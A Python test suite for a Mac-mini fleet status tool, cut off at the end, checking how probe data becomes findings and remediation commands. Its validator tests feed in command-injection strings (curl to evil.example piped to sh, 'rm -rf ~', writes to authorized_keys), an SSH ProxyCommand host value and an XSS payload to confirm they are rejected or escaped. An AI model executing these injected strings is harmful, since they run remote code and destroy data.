#!/usr/bin/env python3
"""Tests for scripts/glaeda-fleet-status. No network, no SSH: sources are fixtures."""
from __future__ import annotations

import contextlib
import importlib.machinery
import importlib.util
import io
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPT = Path(__file__).resolve().parent / "glaeda-fleet-status"
loader = importlib.machinery.SourceFileLoader("glaeda_fleet_status", str(SCRIPT))
spec = importlib.util.spec_from_loader("glaeda_fleet_status", loader)
fs = importlib.util.module_from_spec(spec)
sys.modules["glaeda_fleet_status"] = fs
loader.exec_module(fs)

AT = 1_800_000_000


def src(data, at=AT - 30, error=None):
    return {"ok": error is None, "error": error, "observed_at": at, "data": data}


def manifest(**extra):
    hosts = {
        "mini-a": {"class": "m4pro-48", "roles": ["ci-runner", "dev-builds"], "hostname": "mini-a",
                   "node_id": "cmux-mini-a", "lima_expected": ["linux-base"]},
        "mini-b": {"class": "m4-16", "roles": ["dev-builds"], "hostname": "Mini-B", "node_id": None,
                   "lima_expected": []},
    }
    return src({"fleet": "test", "hosts": hosts, "never_touch": ["coordinator"], **extra})


def bundle(**sources):
    return {"schema": fs.SOURCES_SCHEMA, "collected_at": AT, "sources": {"manifest": manifest(), **sources}}


def build(**sources):
    return fs.build(bundle(**sources), at=AT)


def by_id(doc, prefix):
    return [f for f in doc["findings"] if f["id"].startswith(prefix)]


class ShapeTests(unittest.TestCase):
    def test_every_finding_has_a_typed_action_and_observation_time(self):
        doc = build(
            check=src({"issues": [
                {"host": "mini-a", "area": "xcode", "detail": "licence not accepted",
                 "fix": "sudo env DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer xcodebuild -license accept"},
                {"host": "mini-b", "area": "macos", "detail": "below floor", "fix": "update macOS"},
                {"host": "mini-b", "area": "reach", "detail": "timed out", "fix": ""},
            ], "observed_at": {"mini-a": AT - 10, "mini-b": AT - 20}}),
            controller=src({"workers": [{"host": "mini-a.local", "state": "stale", "action": "check worker"}]}),
        )
        self.assertEqual(doc["schema"], fs.SCHEMA)
        self.assertTrue(doc["findings"])
        for f in doc["findings"]:
            a = f["action"]
            self.assertEqual(set(a), {"id", "who", "safe_to_apply", "command", "note"})
            self.assertIn(a["who"], fs.WHO)
            self.assertIsInstance(a["safe_to_apply"], bool)
            if a["safe_to_apply"]:
                self.assertIsNotNone(a["command"])
            self.assertIn(f["severity"], fs.SEVERITIES)
            self.assertIsNotNone(f["observed_at"])

    def test_sudo_fix_is_a_password_command_run_over_ssh_with_a_tty(self):
        doc = build(check=src({"issues": [
            {"host": "mini-a", "area": "xcode", "detail": "licence not accepted", "fix": "sudo xcodebuild -license accept"}],
            "observed_at": {}}))
        [f] = by_id(doc, "check.xcode@mini-a")
        self.assertEqual(f["action"]["who"], "password")
        self.assertFalse(f["action"]["safe_to_apply"])
        self.assertEqual(f["action"]["command"], "ssh -t -- mini-a 'sudo xcodebuild -license accept'")

    def test_prose_fix_goes_to_a_person_as_a_note_not_a_command(self):
        doc = build(check=src({"issues": [{"host": "mini-b", "area": "macos", "detail": "old", "fix": "update macOS"}],
                               "observed_at": {}}))
        [f] = by_id(doc, "check.macos@mini-b")
        self.assertEqual(f["action"]["who"], "person")
        self.assertIsNone(f["action"]["command"])
        self.assertEqual(f["action"]["note"], "update macOS")

    def test_typed_apply_actions_are_never_safe(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "xcode", "detail": "missing", "fix": "clone",
                                           "action": {"kind": "clone_xcode", "path": "/Applications/X.app"}}],
                               "observed_at": {}}))
        [f] = by_id(doc, "check.xcode@mini-a")
        self.assertEqual(f["action"]["id"], "clone_xcode")
        self.assertFalse(f["action"]["safe_to_apply"])
        self.assertIn("glaeda-mini-fleet apply --host mini-a --yes", f["action"]["command"])


class JoinTests(unittest.TestCase):
    def test_controller_rows_map_by_hostname_and_unknown_hosts_are_findings(self):
        doc = build(controller=src({"workers": [
            {"host": "Mini-B.local", "state": "ready", "busy": False, "free_gib": 200},
            {"host": "mini-z", "state": "ready"},
        ]}))
        member = next(m for m in doc["members"] if m["name"] == "mini-b")
        self.assertEqual(member["controller"]["state"], "ready")
        self.assertEqual(member["status"], "ok")
        [f] = by_id(doc, "controller.unknown_member")
        self.assertIn("mini-z", f["summary"])

    def test_stale_worker_is_an_error_for_a_person(self):
        doc = build(controller=src({"workers": [{"host": "mini-a", "state": "stale", "action": "x"}]}))
        [f] = by_id(doc, "controller.stale@mini-a")
        self.assertEqual((f["severity"], f["action"]["who"]), ("error", "person"))
        self.assertEqual(next(m for m in doc["members"] if m["name"] == "mini-a")["status"], "broken")

    def test_runner_suffix_names_map_to_members_and_offline_is_an_error(self):
        doc = build(runners=src({"runners": [
            {"name": "mini-a-ci2", "status": "offline", "busy": False, "labels": ["self-hosted", "macOS"]},
            {"name": "blacksmith-1", "status": "online", "busy": True, "labels": ["blacksmith"]},
        ]}))
        member = next(m for m in doc["members"] if m["name"] == "mini-a")
        self.assertEqual(member["runners"][0]["name"], "mini-a-ci2")
        [f] = by_id(doc, "runners.offline:mini-a-ci2@mini-a")
        self.assertTrue(f["action"]["safe_to_apply"])  # read-only launchctl listing
        self.assertFalse(by_id(doc, "runners.unknown_member"))

    def test_ci_runner_role_without_a_runner_is_missing(self):
        doc = build(runners=src({"runners": []}))
        [f] = by_id(doc, "runners.missing@mini-a")
        self.assertEqual(f["action"]["who"], "person")
        self.assertFalse(by_id(doc, "runners.missing@mini-b"))

    def test_queued_job_without_an_eligible_online_runner_names_who_should_take_it(self):
        doc = build(
            runners=src({"runners": [
                {"name": "mini-a", "status": "offline", "busy": False,
                 "labels": ["self-hosted", "macOS", "ARM64", "glaeda-mini"]}]}),
            queue=src({"jobs": [
                {"repo": "o/r", "run_id": 1, "job_id": 2, "name": "build",
                 "labels": ["self-hosted", "glaeda-mini"], "created_at": "2026-09-24T00:00:00Z"},
                {"repo": "o/r", "run_id": 1, "job_id": 3, "name": "lint", "labels": ["ubuntu-latest"]},
            ]}),
        )
        [f] = by_id(doc, "queue.no_eligible_runner")
        self.assertIsNone(f["member"])
        self.assertIn("glaeda-mini,self-hosted", f["summary"])
        self.assertIn("should have taken it: mini-a", f["summary"])

    def test_queued_job_with_an_online_runner_is_not_a_finding(self):
        doc = build(
            runners=src({"runners": [{"name": "mini-a", "status": "online", "busy": True,
                                      "labels": ["self-hosted", "glaeda-mini"]}]}),
            queue=src({"jobs": [{"labels": ["self-hosted", "glaeda-mini"]}]}),
        )
        self.assertFalse(by_id(doc, "queue."))

    def test_cache_and_lima(self):
        doc = build(
            cache=src({"endpoints": [{"name": "t5", "reachable": True, "healthy": False, "http_status": 503,
                                      "observed_at": AT - 5}]}),
            lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True, "observed_at": AT - 5, "instances": [
                {"name": "linux-base", "status": "Stopped"},
                {"name": "clone-7", "status": "Stopped"},
                {"name": "clone-8", "status": "Running"}]}}}),
        )
        [cache] = by_id(doc, "cache.unhealthy:t5")
        self.assertEqual(cache["severity"], "error")
        member = next(m for m in doc["members"] if m["name"] == "mini-a")
        self.assertEqual(member["lima"], {"reachable": True, "installed": True, "total": 3, "running": 1,
                                          "orphans": ["clone-7"]})
        [orphan] = by_id(doc, "lima.orphan:clone-7@mini-a")
        self.assertFalse(orphan["action"]["safe_to_apply"])  # deleting a VM is never safe

    def test_check_and_preflight_naming_the_same_command_collapse(self):
        cmd = "sudo pmset -c sleep 0"
        doc = build(
            check=src({"issues": [{"host": "mini-a", "area": "power", "detail": "sleeps", "fix": cmd}],
                       "observed_at": {}}),
            preflight=src({"hosts": {"mini-a": {"ready": False, "checks": {
                "power": {"state": "fail", "detail": "sleeps on AC", "fix": cmd, "group": "password"}}}},
                "observed_at": {}}),
        )
        power = [f for f in doc["findings"] if f["member"] == "mini-a" and f["action"]["command"]
                 and "pmset" in f["action"]["command"]]
        self.assertEqual(len(power), 1)
        self.assertEqual(power[0]["also"], ["preflight.power@mini-a"])


class LiveDataTests(unittest.TestCase):
    """Cases the first run against the real fleet surfaced."""

    def crossed(self):
        # SSH name mini-5's hostname is another member's SSH name, as on the Manaflow minis.
        hosts = {"mini-4": {"class": "c", "roles": [], "hostname": "mini-5", "node_id": None, "lima_expected": []},
                 "mini-5": {"class": "c", "roles": [], "hostname": "mini-4", "node_id": None, "lima_expected": []}}
        return {"manifest": src({"hosts": hosts, "never_touch": []})}

    def test_member_names_win_over_crossed_hostnames(self):
        sources = self.crossed()
        sources["preflight"] = src({"hosts": {"mini-5": {"ready": False, "checks": {
            "zig": {"state": "fail", "detail": "old", "fix": "brew install zig", "group": "self"}}}},
            "observed_at": {"mini-5": AT - 1}})
        doc = fs.build({"schema": fs.SOURCES_SCHEMA, "sources": sources}, at=AT)
        [f] = by_id(doc, "preflight.zig")
        self.assertEqual(f["member"], "mini-5")
        self.assertEqual(f["action"]["command"], "ssh -- mini-5 'brew install zig'")

    def test_a_member_without_issues_still_records_when_it_was_observed(self):
        doc = build(check=src({"issues": [], "observed_at": {"mini-a": AT - 3, "mini-b": AT - 4}}))
        self.assertEqual({m["name"]: m["status"] for m in doc["members"]}["mini-b"], "ok")

    def test_onboarding_blockers_are_warnings_not_breakage(self):
        doc = build(preflight=src({"hosts": {"mini-a": {"ready": False, "checks": {
            "brew": {"state": "fail", "detail": "none", "fix": "install Homebrew (https://brew.sh)", "group": "person"},
            "rust": {"state": "unknown", "detail": "?", "fix": "", "group": ""},
            "runner": {"state": "todo", "detail": "none", "fix": "later", "group": "person"}}}},
            "observed_at": {"mini-a": AT - 1}}))
        severities = {f["code"]: f["severity"] for f in doc["findings"]}
        self.assertEqual(severities, {"brew": "warn", "runner": "info"})  # rust unknown does not block
        self.assertEqual(next(m for m in doc["members"] if m["name"] == "mini-a")["status"], "attention")

    def test_env_prefixed_fix_is_a_command(self):
        fix = "DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer xcodebuild -downloadComponent MetalToolchain"
        doc = build(preflight=src({"hosts": {"mini-a": {"ready": False, "checks": {
            "metal": {"state": "fail", "detail": "missing", "fix": fix, "group": "self"}}}}, "observed_at": {}}))
        [f] = by_id(doc, "preflight.metal@mini-a")
        self.assertEqual((f["action"]["who"], f["action"]["safe_to_apply"]), ("agent", False))
        self.assertIn("downloadComponent", f["action"]["command"])

    def test_fixes_that_mix_command_and_prose_are_notes(self):
        for fix in ("sudo -u admin brew install rustup; link its cargo, rustc and rustup proxies into /opt/homebrew/bin",
                    "brew install zig (or brew upgrade zig); /opt/homebrew/bin comes first on the workload PATH",
                    "cd ~/cmux && rustup default stable (or rustup toolchain install <its channel>)",
                    "install Homebrew, then brew install zig"):
            self.assertIsNone(fs.as_command(fix), fix)
        for fix in ("git clone https://x/glaeda.git ~/glaeda; ~/glaeda/scripts/glaeda-mini-setup --apply",
                    "cd ~/cmux && git submodule update --init --recursive --depth 1",
                    "sudo pmset -c sleep 0"):
            self.assertEqual(fs.as_command(fix), fix)

    def test_truncated_runner_list_does_not_claim_missing_runners(self):
        doc = build(runners=src({"runners": [], "truncated": True}))
        self.assertFalse(by_id(doc, "runners.missing"))
        self.assertTrue(by_id(doc, "runners.truncated@fleet"))


class ReviewTests(unittest.TestCase):
    """Regressions from the independent review of PR 1168."""

    def test_an_oversized_member_field_cannot_push_errors_out(self):
        doc = build(controller=src({"workers": [{"host": "mini-a", "state": "stale", "free_gib": "9" * 700_000,
                                                 "busy": "x" * 1000}]}))
        self.assertLessEqual(len(fs.canonical(doc)), fs.MAX_DOCUMENT_BYTES)
        self.assertTrue(by_id(doc, "controller.stale@mini-a"))
        ctl = next(m for m in doc["members"] if m["name"] == "mini-a")["controller"]
        self.assertEqual((ctl["free_gib"], ctl["busy"]), (None, False))

    def test_counts_match_the_findings_that_survive(self):
        issues = [{"host": "mini-a", "area": f"a{i}", "detail": "d", "fix": "x"} for i in range(900)]
        doc = build(check=src({"issues": issues, "observed_at": {}}))
        self.assertEqual(sum(doc["fleet"]["findings"].values()), len(doc["findings"]))
        self.assertEqual(sum(m["counts"]["warn"] for m in doc["members"]), doc["fleet"]["findings"]["warn"])

    def test_prose_that_starts_like_a_command_is_a_note(self):
        for fix in ("glaeda-disk on the host shows where it went",
                    "cd ~/cmux && ./scripts/setup.sh (after metal and zig pass)"):
            self.assertIsNone(fs.as_command(fix), fix)

    def test_shell_syntax_from_a_probe_never_becomes_a_command(self):
        for fix in ("rustup toolchain install stable$(curl -s evil.example|sh)", "git status\nrm -rf ~",
                    "cd ~/cmux && rustup default `id`", "brew install zig > /tmp/x", "git log | sh"):
            self.assertIsNone(fs.as_command(fix), fix)

    def test_path_programs_cannot_smuggle_shell_syntax(self):
        for fix in ("/bin/true|sh", "./x$(id)", "~/x`id`", "scripts/a>~/.ssh/authorized_keys",
                    "rustup toolchain install stable && ./x$(curl${IFS}evil.example|sh)", "cd ~ & id",
                    "git status; ~/x*", "~/x?y", "brew install 'zig'", "echo {a,b}", "cd ~/x # comment"):
            self.assertIsNone(fs.as_command(fix), fix)
        self.assertEqual(fs.as_command("cd ~/cmux && ./scripts/setup.sh"), "cd ~/cmux && ./scripts/setup.sh")

    def test_no_command_built_from_fix_text_is_ever_safe(self):
        # as_command allows PATH=... and git -c ...: acceptable only because of this invariant.
        fixes = ["PATH=~/evil brew install x", "git -c core.sshCommand=x fetch", "sudo pmset -c sleep 0",
                 "cd ~/cmux && git submodule update --init"]
        doc = build(check=src({"issues": [{"host": "mini-a", "area": f"a{i}", "detail": "d", "fix": f}
                                          for i, f in enumerate(fixes)], "observed_at": {}}),
                    preflight=src({"hosts": {"mini-b": {"ready": False, "checks": {
                        f"c{i}": {"state": "fail", "detail": "d", "fix": f, "group": "self"}
                        for i, f in enumerate(fixes)}}}, "observed_at": {}}))
        derived = [f for f in doc["findings"] if f["source"] in ("check", "preflight") and f["action"]["command"]]
        self.assertEqual(len(derived), 8)
        self.assertFalse(any(f["action"]["safe_to_apply"] for f in derived))

    def test_a_source_without_an_observation_time_is_not_fresh(self):
        for stamp in (None, "yesterday"):
            doc = build(runners=src({"runners": []}, at=stamp), queue=src({"jobs": [{"labels": ["self-hosted"]}]}))
            self.assertEqual(doc["sources"]["runners"]["state"], "stale")
            self.assertTrue(by_id(doc, "runners.no_observation_time@fleet"))
            self.assertTrue(by_id(doc, "queue.unjudged@fleet"))

    def test_nameless_lima_instances_are_skipped(self):
        doc = build(lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True,
                                                   "instances": [{"status": "Stopped"}]}}}))
        self.assertFalse(by_id(doc, "lima."))

    def test_secrets_and_home_paths_withhold_the_command(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "git", "detail": "clone",
                                           "fix": "git clone https://ghp_" + "a" * 30 + "@github.com/a/b /Users/leo/x"}],
                               "observed_at": {}}))
        text = json.dumps(doc)
        self.assertNotIn("ghp_a", text)
        self.assertNotIn("/Users/leo", text)
        [f] = by_id(doc, "check.git@mini-a")
        self.assertEqual((f["action"]["who"], f["action"]["command"]), ("person", None))

    def test_queue_is_not_judged_without_a_fresh_complete_runner_list(self):
        job = {"labels": ["self-hosted", "macOS"]}
        for runners in (None, src(None, error="HTTP 403"), src({"runners": []}, at=AT - 5000),
                        src({"runners": [], "truncated": True})):
            sources = {"queue": src({"jobs": [job]})}
            if runners is not None:
                sources["runners"] = runners
            doc = build(**sources)
            self.assertFalse(by_id(doc, "queue.no_eligible_runner"), runners)
            self.assertTrue(by_id(doc, "queue.unjudged@fleet"), runners)

    def test_an_online_runner_outside_the_fleet_serves_the_queue(self):
        doc = build(runners=src({"runners": [{"name": "someone-elses-mac", "status": "online", "busy": False,
                                              "labels": ["self-hosted", "macOS"]}]}),
                    queue=src({"jobs": [{"labels": ["self-hosted", "macOS"]}]}))
        self.assertFalse(by_id(doc, "queue."))

    def test_malformed_bundles_fail_cleanly(self):
        for sources in ({"check": src(["not", "an", "object"])},
                        {"lima": src({"hosts": {"mini-a": {"reachable": True, "instances": [{"status": "Stopped"}]}}})},
                        {"controller": src({"workers": []}, at="yesterday")},
                        {"runners": src({"runners": [None, {"name": 3, "labels": [None]}]})}):
            try:
                doc = build(**sources)
            except fs.Failure:
                continue
            self.assertEqual(doc["schema"], fs.SCHEMA)

    def test_two_offline_runners_on_one_member_are_two_findings(self):
        doc = build(runners=src({"runners": [{"name": "mini-a-1", "status": "offline", "labels": []},
                                             {"name": "mini-a-2", "status": "offline", "labels": []}]}))
        self.assertEqual(len(by_id(doc, "runners.offline")), 2)

    def test_several_stale_sources_stay_separate(self):
        doc = build(controller=src({"workers": []}, at=AT - 5000), cache=src({"endpoints": []}, at=AT - 5000))
        self.assertEqual(len([f for f in doc["findings"] if f["code"] == "stale"]), 2)

    def test_hosts_outside_the_manifest_get_no_ssh_command(self):
        doc = build(check=src({"issues": [{"host": "-oProxyCommand=touch /tmp/pwn", "area": "git",
                                           "detail": "x", "fix": "git status"}], "observed_at": {}}))
        self.assertFalse([f for f in doc["findings"] if f["action"]["command"]])
        self.assertTrue(by_id(doc, "check.unknown_member@fleet"))
        self.assertIsNone(fs.remote("-oProxyCommand=x", "true"))

    def test_lima_names_are_validated_before_they_reach_a_command(self):
        doc = build(lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True, "instances": [
            {"name": "ok-1", "status": "Stopped"}, {"name": "-rf", "status": "Stopped"},
            {"name": "nostatus", "status": ""}]}}}))
        commands = [f["action"]["command"] for f in by_id(doc, "lima.orphan")]
        self.assertEqual(sorted(c for c in commands if c), ["ssh -- mini-a 'limactl delete -- ok-1'"])
        self.assertEqual(len(commands), 2)  # an instance with no status is not an orphan

    def test_glaeda_disk_is_not_marked_safe(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "disk", "detail": "low", "fix": "glaeda-disk"}],
                               "observed_at": {}}))
        [f] = by_id(doc, "check.disk@mini-a")
        self.assertFalse(f["action"]["safe_to_apply"])


class SafetyTests(unittest.TestCase):
    def test_never_touch_members_get_no_command_and_no_agent(self):
        doc = build(controller=src({"workers": [{"host": "coordinator", "state": "below CMUX start floor"}]}))
        [f] = by_id(doc, "controller.below_cmux_start_floor@coordinator")
        self.assertEqual(f["action"]["who"], "person")
        self.assertIsNone(f["action"]["command"])
        self.assertFalse(f["action"]["safe_to_apply"])
        self.assertIn("never_touch", f["action"]["note"])
        self.assertTrue(next(m for m in doc["members"] if m["name"] == "coordinator")["never_touch"])

    def test_secrets_and_home_paths_never_reach_the_document(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "worker",
                                           "detail": "token=abc123 ghp_" + "x" * 30 + " in /Users/alice/secret",
                                           "fix": "provision secrets"}], "observed_at": {}}))
        text = json.dumps(doc)
        self.assertNotIn("abc123", text)
        self.assertNotIn("ghp_x", text)
        self.assertNotIn("alice", text)

    def test_stale_and_unavailable_sources_are_findings(self):
        doc = build(controller=src({"workers": []}, at=AT - 5000),
                    runners=src(None, error="gh api: HTTP 403"))
        self.assertEqual(doc["sources"]["controller"]["state"], "stale")
        self.assertEqual(doc["sources"]["runners"]["state"], "unavailable")
        self.assertEqual(doc["sources"]["queue"]["state"], "not_collected")
        [stale] = by_id(doc, "controller.stale@fleet")
        self.assertTrue(stale["action"]["safe_to_apply"])
        self.assertEqual(stale["action"]["command"], "glaeda-fleet-status")
        self.assertTrue(by_id(doc, "runners.unavailable@fleet"))

    def test_output_stays_bounded(self):
        instances = [{"name": f"clone-{i}", "status": "Stopped"} for i in range(5000)]
        issues = [{"host": "mini-a", "area": f"a{i}", "detail": "d" * 5000, "fix": "x"} for i in range(2000)]
        doc = build(lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True, "instances": instances}}}),
                    check=src({"issues": issues, "observed_at": {}}))
        self.assertLessEqual(len(doc["findings"]), fs.MAX_FINDINGS)
        self.assertGreater(doc["fleet"]["truncated_findings"], 0)
        self.assertLessEqual(len(fs.canonical(doc)), fs.MAX_DOCUMENT_BYTES)
        self.assertTrue(all(len(f["summary"]) <= fs.MAX_TEXT for f in doc["findings"]))
        self.assertLessEqual(len(next(m for m in doc["members"] if m["name"] == "mini-a")["lima"]["orphans"]), 16)

    def test_rejects_a_foreign_bundle(self):
        with self.assertRaises(fs.Failure):
            fs.build({"schema": "other"}, at=AT)


class RenderTests(unittest.TestCase):
    def test_html_escapes_everything_and_comes_from_the_same_document(self):
        doc = build(check=src({"issues": [{"host": "mini-a", "area": "xcode",
                                           "detail": "<script>alert(1)</script>", "fix": "x"}], "observed_at": {}}))
        page = fs.render_html(doc)
        self.assertNotIn("<script>", page)
        self.assertIn("&lt;script&gt;", page)
        self.assertIn("prefers-color-scheme:dark", page)
        text = fs.render_text(doc)
        self.assertIn("mini-a", text)

    def test_cli_build_then_render_round_trip(self):
        with tempfile.TemporaryDirectory() as tmp:
            sources = Path(tmp) / "sources.json"
            status = Path(tmp) / "status.json"
            page = Path(tmp) / "status.html"
            sources.write_text(json.dumps(bundle(controller=src({"workers": [{"host": "mini-a", "state": "stale"}]},
                                                                at=fs.now()))))
            with contextlib.redirect_stdout(io.StringIO()):
                code = fs.main(["build", str(sources), "--out", str(status), "--output", "json"])
            self.assertEqual(code, 1)  # the stale worker is an error
            doc = json.loads(status.read_text())
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(fs.main(["render", str(status), "--html", str(page)]), 1)
            self.assertIn("mini-a", page.read_text())
            self.assertEqual(doc["schema"], fs.SCHEMA)

    def test_cli_errors_exit_2(self):
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(fs.main(["build"]), 2)
            self.assertEqual(fs.main(["status", "--github-runners", "users/x"]), 2)


class CollectTests(unittest.TestCase):
    def test_lima_parses_instances_and_reports_missing_limactl(self):
        listing = '{"name":"a","status":"Running"}\n{"name":"b","status":"Stopped"}\n'
        with mock.patch.object(fs.subprocess, "run", return_value=subprocess.CompletedProcess([], 0, listing, "")):
            row = fs.lima_host("mini-a", "builder")
        self.assertEqual([i["name"] for i in row["instances"]], ["a", "b"])
        with mock.patch.object(fs.subprocess, "run",
                               return_value=subprocess.CompletedProcess([], 0, '{"no_lima":true}\n', "")):
            self.assertFalse(fs.lima_host("mini-a", "builder")["installed"])

    def test_lima_skips_never_touch_hosts(self):
        seen = []
        with mock.patch.object(fs, "lima_host", side_effect=lambda h, u: seen.append(h) or {"reachable": True}):
            fs.collect_lima({"ssh_user": "builder", "never_touch": ["coordinator"]}, ["mini-a", "coordinator"])
        self.assertEqual(seen, ["mini-a"])

    def test_child_env_is_allowlisted(self):
        with mock.patch.dict(fs.os.environ, {"AWS_SECRET_ACCESS_KEY": "x", "HOME": "/h"}, clear=True):
            self.assertEqual(fs.child_env(), {"HOME": "/h"})

    def test_cache_spec_must_be_name_equals_url(self):
        with self.assertRaises(fs.Failure):
            fs.collect_cache(["t5"])


GIB = 1024**3


def disk_row(**extra):
    row = {"reachable": True, "installed": True, "error": None, "observed_at": AT - 5, "free": 200 * GIB,
           "total": 460 * GIB, "low": 69 * GIB, "sizes_at": AT - 600, "fleet_cas": False, "prune_job_at": None,
           "families": [{"family": "tmp", "bytes": 12 * GIB, "owner": "agents and tools", "retired": False}]}
    row.update(extra)
    return row


def disk(**rows):
    return src({"hosts": {name.replace("_", "-"): row for name, row in rows.items()}})


class DiskTests(unittest.TestCase):
    def member(self, doc, name="mini-a"):
        return next(m for m in doc["members"] if m["name"] == name)

    def test_a_healthy_member_is_one_info_summary(self):
        doc = build(disk=disk(mini_a=disk_row()))
        [f] = by_id(doc, "disk.")
        self.assertEqual((f["id"], f["severity"]), ("disk.summary@mini-a", "info"))
        self.assertEqual(f["action"]["command"], "ssh -- mini-a '~/.local/bin/glaeda-disk'")
        self.assertFalse(f["action"]["safe_to_apply"])  # glaeda-disk may rewrite its snapshot
        d = self.member(doc)["disk"]
        self.assertEqual((d["free_bytes"], d["cache_bytes"], d["under_pressure"]), (200 * GIB, 12 * GIB, False))
        self.assertEqual(self.member(doc)["status"], "ok")

    def test_a_member_under_pressure_warns_with_a_report_command(self):
        doc = build(disk=disk(mini_a=disk_row(free=30 * GIB)))
        [f] = by_id(doc, "disk.pressure@mini-a")
        self.assertEqual(f["severity"], "warn")
        self.assertIn("30.0 GiB free of 460.0, below the pressure threshold 69.0 GiB", f["summary"])
        self.assertEqual((f["action"]["who"], f["action"]["safe_to_apply"]), ("agent", False))
        self.assertNotIn("rm ", f["action"]["command"])
        self.assertFalse(by_id(doc, "disk.summary"))
        self.assertEqual(self.member(doc)["status"], "attention")
        self.assertIn("UNDER PRESSURE", fs.render_text(doc))

    def test_a_retired_owner_holding_more_than_5_gib_needs_a_person(self):
        families = [{"family": "hq-build-fleet-cache", "bytes": 21 * GIB, "owner": "cmux dev-build worker (hq controller)",
                     "retired": True},
                    {"family": "old-small", "bytes": 4 * GIB, "owner": "gone", "retired": True},
                    {"family": "user-cache", "bytes": 170 * GIB, "owner": "", "retired": False}]
        doc = build(disk=disk(mini_a=disk_row(families=families)))
        [f] = by_id(doc, "disk.retired_owner")
        self.assertEqual(f["id"], "disk.retired_owner:hq-build-fleet-cache@mini-a")
        self.assertEqual((f["action"]["who"], f["action"]["command"]), ("person", None))
        self.assertIn("RETIRED 25.0 GiB", fs.disk_line(self.member(doc)["disk"], AT))

    def test_gc_skip_and_failed_prune_warn_but_other_skips_do_not(self):
        doc = build(disk=disk(
            mini_a=disk_row(fleet_cas=True, prune={"at": AT - 600, "result": "ok", "role": "writer"},
                            gc={"at": AT - 7200, "result": "skipped: kept entries name no stored object, so the "
                                                           "ID heuristic is suspect", "dry_run": "kept ...: 3"}),
            mini_b=disk_row(fleet_cas=True, prune={"at": AT - 600, "result": "failed"},
                            gc={"at": AT - 60, "result": "skipped: the dry run failed or fleet-cas predates gc"})))
        [skip] = by_id(doc, "disk.gc_skipped@mini-a")
        self.assertEqual((skip["severity"], skip["action"]["who"]), ("warn", "person"))
        self.assertTrue(by_id(doc, "disk.prune_failed@mini-b"))
        self.assertFalse(by_id(doc, "disk.gc_skipped@mini-b"))

    def test_a_silent_prune_job_warns_only_after_three_hours(self):
        doc = build(disk=disk(
            mini_a=disk_row(fleet_cas=True, prune={"at": AT - 4 * 3600, "result": "ok"}),
            mini_b=disk_row(fleet_cas=True, prune_job_at=AT - 3600)))
        [f] = by_id(doc, "disk.prune_silent")
        self.assertEqual(f["member"], "mini-a")
        self.assertEqual(f["action"]["command"],
                         "ssh -- mini-a 'launchctl list com.teamleaderleo.glaeda.fleet-cas-prune'")
        self.assertTrue(f["action"]["safe_to_apply"])  # literal read-only listing
        doc = build(disk=disk(mini_a=disk_row(fleet_cas=True, prune_job_at=AT - 4 * 3600),
                              mini_b=disk_row(fleet_cas=True)))
        self.assertTrue(by_id(doc, "disk.prune_silent@mini-a"))
        self.assertTrue(by_id(doc, "disk.prune_missing@mini-b"))
        # no fleet-cas: no prune expectations at all
        self.assertFalse(by_id(build(disk=disk(mini_a=disk_row())), "disk.prune"))

    def test_missing_logs_and_tool_are_graceful(self):
        row = fs.parse_disk('@disk\n{"no_glaeda_disk":true}\n@sizes_at\n@prune_job_at\n@prune\n\n@fleet_cas\n'
                            '@receipts\n\n@now\n1800000000\n', AT)
        self.assertEqual((row["installed"], row["error"]), (False, None))
        self.assertNotIn("prune", row)
        self.assertNotIn("reclaimed_24h", row)
        doc = build(disk=disk(mini_a=row, mini_b={"reachable": False, "error": "TimeoutExpired", "observed_at": AT}))
        self.assertEqual({(f["id"], f["severity"]) for f in by_id(doc, "disk.")},
                         {("disk.no_glaeda_disk@mini-a", "info"), ("disk.probe_failed@mini-b", "info")})
        [timed_out] = by_id(doc, "disk.probe_failed")
        self.assertIn("TimeoutExpired", timed_out["summary"])
        self.assertEqual(self.member(doc, "mini-b")["disk"], {"reachable": False})
        self.assertIn("unreachable", fs.render_text(doc))
        self.assertEqual(fs.parse_disk("", AT)["error"], "glaeda-disk printed no JSON")
        # no snapshot: glaeda-disk would du everything first, so the probe does not run it
        row = fs.parse_disk('@disk\n{"no_snapshot":true}\n@now\n1\n', AT)
        self.assertEqual(row["error"], "glaeda-disk has no size snapshot yet")
        [f] = by_id(build(disk=disk(mini_a=row)), "disk.")
        self.assertEqual((f["code"], f["severity"]), ("unreadable", "info"))

    def test_parse_reduces_the_probe_to_numbers_without_paths(self):
        report = {"free": 100 * GIB, "total": 460 * GIB, "idle_hours": 24,
                  "filesystems": [{"dev": 1, "mount": "/", "free": 100 * GIB, "total": 460 * GIB, "low": 69 * GIB,
                                   "target": 115 * GIB, "tmpfs": False}],
                  "owners": {"hq": {"owner": "worker", "retired": True}, "empty": {"owner": "x", "retired": False}},
                  "items": [{"family": "hq", "path": "/Users/cmux/secret/a", "bytes": 3 * GIB},
                            {"family": "hq", "path": "/Users/cmux/secret/b", "bytes": 4 * GIB},
                            {"family": "tmp", "path": "/private/tmp/x", "bytes": GIB}]}
        receipts = [{"at": "2027-01-15T08:00:00+0000", "outcome": "reclaimed", "bytes": 2 * GIB},
                    {"at": "2027-01-15T07:00:00+0000", "outcome": "changed:in-use", "bytes": 9 * GIB},
                    {"at": "2027-01-10T00:00:00+0000", "outcome": "reclaimed", "bytes": 9 * GIB}]
        now = 1_800_000_000  # 2027-01-15T08:00:00Z
        prune = [{"at": "2027-01-14T08:00:00+0000", "gc": "ran", "result": "ok",
                  "gc_dry_run": "dry run: in /Users/cmux/store; kept entries naming no stored object: 0"},
                 {"at": "2027-01-15T07:00:00+0000", "gc": "not due", "result": "ok", "role": "reader",
                  "node_store_bytes": 5, "local_cas_bytes": 6}]
        stdout = ("@disk\n" + json.dumps(report, indent=2) + "\n@sizes_at\n1799999000\n@prune_job_at\n1799000000\n"
                  "@prune\n{\"cut off at the front\n" + "\n".join(map(json.dumps, prune)) +
